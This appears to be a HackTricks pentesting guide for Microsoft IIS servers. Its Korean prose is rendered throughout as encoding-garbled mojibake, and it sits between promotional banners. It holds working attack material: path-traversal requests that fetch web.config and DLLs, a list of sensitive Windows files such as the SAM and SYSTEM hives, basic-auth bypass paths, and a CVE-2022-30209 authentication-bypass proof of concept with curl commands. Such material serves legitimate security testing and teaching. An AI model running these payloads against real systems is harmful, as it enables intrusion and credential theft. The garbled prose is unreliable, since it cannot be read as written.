# IIS - ì¸í„°ë„· ì •ë³´ ì„œë¹„ìŠ¤

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ í™œìš©í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, **ë¬´ë£Œ** ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ íšŒì‚¬ë‚˜ ê³ ê°ì´ **ìŠ¤í‹¸ëŸ¬ ì•…ì„± ì½”ë“œ**ì— ì˜í•´ **ì¹¨í•´**ë‹¹í–ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ ë„ë‚œ ì•…ì„± ì½”ë“œë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ í™•ì¸í•˜ê³  **ë¬´ë£Œ**ë¡œ ì—”ì§„ì„ ì‹œí—˜í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

---

í…ŒìŠ¤íŠ¸ ê°€ëŠ¥í•œ ì‹¤í–‰ íŒŒì¼ í™•ì¥ì:

* asp
* aspx
* config
* php

## ë‚´ë¶€ IP ì£¼ì†Œ ë…¸ì¶œ

302ë¥¼ ë°›ëŠ” ëª¨ë“  IIS ì„œë²„ì—ì„œ Host í—¤ë”ë¥¼ ì œê±°í•˜ê³  HTTP/1.0ì„ ì‚¬ìš©í•´ë³´ë©´ ì‘ë‹µ ë‚´ë¶€ì˜ Location í—¤ë”ê°€ ë‚´ë¶€ IP ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
ë‚´ë¶€ IPë¥¼ ë…¸ì¶œí•˜ëŠ” ì‘ë‹µ:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config íŒŒì¼ ì‹¤í–‰

.config íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  í•´ë‹¹ íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ íŒŒì¼ ëì— HTML ì£¼ì„ ë‚´ì— ì½”ë“œë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: [ì—¬ê¸°ì—ì„œ ì˜ˆì œ ë‹¤ìš´ë¡œë“œ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë” ë§ì€ ì •ë³´ ë° ê¸°ìˆ ì€ [ì—¬ê¸°](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## IIS íƒì§€ ë¸Œë£¨íŠ¸í¬ìŠ¤

ë‹¤ìŒìœ¼ë¡œ ë§Œë“  ëª©ë¡ì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ì´ ëª©ë¡ì€ ë‹¤ìŒ ëªë‹¨ì˜ ë‚´ìš©ì„ ë³‘í•©í•˜ì—¬ ë§Œë“¤ì–´ì¡ŒìŠµë‹ˆë‹¤:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

í™•ì¥ìë¥¼ ì¶”ê°€í•˜ì§€ ì•Šê³  ì‚¬ìš©í•˜ì‹­ì‹œì˜¤. í•„ìš”í•œ íŒŒì¼ì—ëŠ” ì´ë¯¸ í™•ì¥ìê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

## ê²½ë¡œ ì´íƒˆ

### ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ

ì „ì²´ ì„¤ëª…ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì‹­ì‹œì˜¤: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
ìš”ì•½í•˜ë©´, ì‘ìš© í”„ë¡œê·¸ë¨ í´ë” ë‚´ì— "**assemblyIdentity**" íŒŒì¼ê³¼ "**namespaces**"ì— ëŒ€í•œ ì°¸ì¡°ê°€ í¬í•¨ëœ ì—¬ëŸ¬ web.config íŒŒì¼ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ í†µí•´ **ì‹¤í–‰ íŒŒì¼ì´ ì–´ë””ì— ìˆëŠ”ì§€** ì•Œ ìˆ˜ ìˆê³  ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìš´ë¡œë“œí•œ Dllì—ì„œëŠ” **ìƒˆë¡œìš´ namespaces**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©° ì•¡ì„¸ìŠ¤í•˜ê³  web.config íŒŒì¼ì„ ê°€ì ¸ì™€ ìƒˆë¡œìš´ namespacesì™€ assemblyIdentityë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.\
ë˜í•œ, íŒŒì¼ **connectionstrings.config** ë° **global.asax**ì—ëŠ” í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\\
{% endhint %}

**.Net MVC ì‘ìš© í”„ë¡œê·¸ë¨**ì—ì„œ **web.config** íŒŒì¼ì€ **"assemblyIdentity"** XML íƒœê·¸ë¥¼ í†µí•´ ì‘ìš© í”„ë¡œê·¸ë¨ì´ ì˜ì¡´í•˜ëŠ” ê° ì´ì§„ íŒŒì¼ì„ ì§€ì •í•˜ì—¬ ì¤‘ìš”í•œ ì—­í• ì„ í•©ë‹ˆë‹¤.

### **ì´ì§„ íŒŒì¼ íƒìƒ‰**

ì•„ë˜ëŠ” **web.config** íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
ì´ ìš”ì²­ì€ ë‹¤ì–‘í•œ ì„¤ì • ë° ì¢…ì†ì„±ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

* **EntityFramework** ë²„ì „
* ì›¹í˜ì´ì§€, í´ë¼ì´ì–¸íŠ¸ ìœ íš¨ì„± ê²€ì‚¬ ë° JavaScriptë¥¼ ìœ„í•œ **AppSettings**
* ì¸ì¦ ë° ëŸ°íƒ€ì„ì„ ìœ„í•œ **System.web** êµ¬ì„±
* **System.webServer** ëª¨ë“ˆ ì„¤ì •
* **Microsoft.Owin**, **Newtonsoft.Json**, **System.Web.Mvc**ì™€ ê°™ì€ ë‹¤ì–‘í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ìœ„í•œ **Runtime** ì–´ì…ˆë¸”ë¦¬ ë°”ì¸ë”©

ì´ëŸ¬í•œ ì„¤ì •ì€ íŠ¹ì • íŒŒì¼(**/bin/WebGrease.dll**ì™€ ê°™ì€)ì´ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ /bin í´ë”ì— ìœ„ì¹˜í•´ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### **ë£¨íŠ¸ ë””ë ‰í† ë¦¬ íŒŒì¼**

ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì— ìˆëŠ” íŒŒì¼ë“¤(**/global.asax** ë° ë¯¼ê°í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•˜ëŠ” **/connectionstrings.config** ë“±)ì€ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ êµ¬ì„± ë° ì‘ë™ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.

### **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë° Web.Config**

MVC ì‘ìš© í”„ë¡œê·¸ë¨ì€ ê° íŒŒì¼ì—ì„œ ë°˜ë³µì ì¸ ì„ ì–¸ì„ í”¼í•˜ê¸° ìœ„í•´ íŠ¹ì • ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ìœ„í•œ ì¶”ê°€ **web.config íŒŒì¼**ì„ ì •ì˜í•©ë‹ˆë‹¤. ë‹¤ë¥¸ **web.config**ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ìš”ì²­ì„ í†µí•´ ì´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL ë‹¤ìš´ë¡œë“œ**

ì‚¬ìš©ì ì§€ì • ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ì–¸ê¸‰ì€ /bin ë””ë ‰í† ë¦¬ì— ìˆëŠ” "**WebApplication1**"ì´ë¼ëŠ” DLLì„ ì‹œì‚¬í•©ë‹ˆë‹¤. ì´ì— ì´ì–´ **WebApplication1.dll**ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ìš”ì²­ì´ í‘œì‹œë©ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
ì´ëŠ” **System.Web.Mvc.dll** ë° **System.Web.Optimization.dll**ê³¼ ê°™ì€ ë‹¤ë¥¸ í•„ìˆ˜ DLLì´ /bin ë””ë ‰í† ë¦¬ì— ì¡´ì¬í•  ê°€ëŠ¥ì„±ì„ ì‹œì‚¬í•©ë‹ˆë‹¤.

DLLì´ **WebApplication1.Areas.Minded**ë¼ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê°€ì ¸ì˜¤ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ, ê³µê²©ìëŠ” **/area-name/Views/**ì™€ ê°™ì€ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ê²½ë¡œì— ë‹¤ë¥¸ web.config íŒŒì¼ì˜ ì¡´ì¬ë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ íŒŒì¼ì€ /bin í´ë”ì— ìˆëŠ” ë‹¤ë¥¸ DLLì— ëŒ€í•œ íŠ¹ì • êµ¬ì„± ë° ì°¸ì¡°ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **/Minded/Views/web.config**ë¡œì˜ ìš”ì²­ì€ ë‹¤ë¥¸ DLLì¸ **WebApplication1.AdditionalFeatures.dll**ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì„± ë° ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê³µê°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µí†µ íŒŒì¼

[ì—¬ê¸°](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ì—ì„œ
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ì—ëŸ¬

ë§Œì•½ ë‹¤ìŒê³¼ ê°™ì€ ì—ëŸ¬ë¥¼ ë³¸ë‹¤ë©´:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

ì´ê²ƒì€ ì„œë²„ê°€ **ì˜¬ë°”ë¥¸ ë„ë©”ì¸ ì´ë¦„ì„ Host í—¤ë” ë‚´ì—ì„œ ë°›ì§€ ëª»í–ˆìŒ**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.\
ì›¹ í˜ì´ì§€ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì œê³µëœ **SSL ì¸ì¦ì„œ**ë¥¼ í™•ì¸í•˜ì—¬ ë„ë©”ì¸/ì„œë¸Œë„ë©”ì¸ ì´ë¦„ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ê³³ì— ì—†ë‹¤ë©´ **ì˜¬ë°”ë¥¸ ê²ƒì„ ì°¾ì„ ë•Œê¹Œì§€ VHostsë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…(brute force)** í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

## ì°¾ì•„ë³¼ ê°€ì¹˜ê°€ ìˆëŠ” ì˜¤ë˜ëœ IIS ì·¨ì•½ì 

### Microsoft IIS ë¬¼ê²° ë¬¸ì "\~" ì·¨ì•½ì /ê¸°ëŠ¥ - ì§§ì€ íŒŒì¼/í´ë” ì´ë¦„ ë…¸ì¶œ

ì´ **ê¸°ë²•**ì„ ì‚¬ìš©í•˜ì—¬ ë°œê²¬ëœ ê° í´ë” ë‚´ì˜ í´ë”ì™€ íŒŒì¼ì„ **ì—´ê±°í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ê¸°ë³¸ ì¸ì¦ì´ í•„ìš”í•œ ê²½ìš°ì—ë„).\
ì´ ê¸°ë²•ì˜ ì£¼ìš” ì œí•œ ì‚¬í•­ì€ ì„œë²„ê°€ ì·¨ì•½í•˜ë‹¤ë©´ **ê° íŒŒì¼/í´ë” ì´ë¦„ì˜ ì²˜ìŒ 6ì ë° íŒŒì¼ì˜ í™•ì¥ìì˜ ì²˜ìŒ 3ìê¹Œì§€ë§Œ ì°¾ì„ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (841).png>)

ì›ë³¸ ì—°êµ¬: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ë˜í•œ **metasploit**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `use scanner/http/iis_shortname_scanner`

### ê¸°ë³¸ ì¸ì¦ ìš°íšŒ

**ê¸°ë³¸ ì¸ì¦**(IIS 7.5)ì„ ìš°íšŒí•˜ë ¤ë©´ ë‹¤ìŒì„ ì‹œë„í•´ë³´ì„¸ìš”: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ë˜ëŠ” `/admin::$INDEX_ALLOCATION/admin.php`

ì´ ì·¨ì•½ì ê³¼ ë§ˆì§€ë§‰ ì·¨ì•½ì ì„ **í˜¼í•©**í•˜ì—¬ ìƒˆë¡œìš´ **í´ë”**ë¥¼ ì°¾ê³  ì¸ì¦ì„ **ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ASP.NET Trace.AXD ë””ë²„ê¹… í™œì„±í™”

ASP.NETì—ëŠ” ë””ë²„ê¹… ëª¨ë“œê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©° í•´ë‹¹ íŒŒì¼ì€ `trace.axd`ì…ë‹ˆë‹¤.

ì¼ì • ê¸°ê°„ ë™ì•ˆ ì‘ìš© í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ëª¨ë“  ìš”ì²­ì˜ ë§¤ìš° ìƒì„¸í•œ ë¡œê·¸ë¥¼ ìœ ì§€í•©ë‹ˆë‹¤.

ì´ ì •ë³´ì—ëŠ” ì›ê²© í´ë¼ì´ì–¸íŠ¸ IP, ì„¸ì…˜ ID, ëª¨ë“  ìš”ì²­ ë° ì‘ë‹µ ì¿ í‚¤, ë¬¼ë¦¬ì  ê²½ë¡œ, ì†ŒìŠ¤ ì½”ë“œ ì •ë³´ ë° ì•„ë§ˆë„ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ë„ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH ì¿ í‚¤

ASPXAUTHëŠ” ë‹¤ìŒ ì •ë³´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:

* **`validationKey`** (ë¬¸ìì—´): ì„œëª… ìœ íš¨ì„± ê²€ì‚¬ì— ì‚¬ìš©í•  16ì§„ìˆ˜ë¡œ ì¸ì½”ë”©ëœ í‚¤.
* **`decryptionMethod`** (ë¬¸ìì—´): (ê¸°ë³¸ê°’ "AES").
* **`decryptionIV`** (ë¬¸ìì—´): 16ì§„ìˆ˜ë¡œ ì¸ì½”ë”©ëœ ì´ˆê¸°í™” ë²¡í„° (ê¸°ë³¸ê°’ì€ 0 ë²¡í„°).
* **`decryptionKey`** (ë¬¸ìì—´): ë³µí˜¸í™”ì— ì‚¬ìš©í•  16ì§„ìˆ˜ë¡œ ì¸ì½”ë”©ëœ í‚¤.

ê·¸ëŸ¬ë‚˜ ì¼ë¶€ ì‚¬ëŒë“¤ì€ ì´ëŸ¬í•œ ë§¤ê°œë³€ìˆ˜ì˜ **ê¸°ë³¸ê°’**ì„ ì‚¬ìš©í•˜ê³  **ì‚¬ìš©ìì˜ ì´ë©”ì¼ì„ ì¿ í‚¤ë¡œ ì‚¬ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ê³µê²© ëŒ€ìƒ ì„œë²„ì—ì„œ **ì‚¬ìš©ìì˜ ì´ë©”ì¼ì„ ì‚¬ìš©ìë¡œ ë§Œë“œëŠ”** ì›¹ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´, ë‘ ë²ˆì§¸ ì„œë²„ì—ì„œ ì–»ì€ ì¿ í‚¤ë¥¼ ì²« ë²ˆì§¸ ì„œë²„ì—ì„œ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¥¼ í‰ë‚´ ë‚¼ ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.\
ì´ ê³µê²©ì€ ì´ [**ê¸°ìˆ  ë¬¸ì„œ**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ì—ì„œ ì‘ë™í–ˆìŠµë‹ˆë‹¤.

## ìºì‹œëœ ì•”í˜¸ë¥¼ ì‚¬ìš©í•œ IIS ì¸ì¦ ìš°íšŒ (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[ì „ì²´ ë³´ê³ ì„œ ì—¬ê¸°ì—ì„œ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): ì½”ë“œì—ì„œì˜ ë²„ê·¸ë¡œ ì¸í•´ **ì‚¬ìš©ìê°€ ì œê³µí•œ ì•”í˜¸ë¥¼ ì œëŒ€ë¡œ í™•ì¸í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì—**, ì´ë¯¸ **ìºì‹œì— ìˆëŠ” í‚¤ì— í•´ë‹¹í•˜ëŠ” ì•”í˜¸ í•´ì‹œê°€ ì¼ì¹˜í•˜ëŠ” ê³µê²©ìëŠ” í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ í™œìš©í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê·¸ ê³ ê°ì´ **ìŠ¤í‹¸ëŸ¬ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´**ì— ì˜í•´ **ì¹¨í•´**ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” **ë¬´ë£Œ** ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ë¥¼ ë„ë‚œë‹¹í•œ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ì™€ ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë§‰ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ì—¬ **ë¬´ë£Œ**ë¡œ ì—”ì§„ì„ ì‹œë„í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¥¼ í†µí•´ ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **HackTricksì— ê·€ì‚¬ë¥¼ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
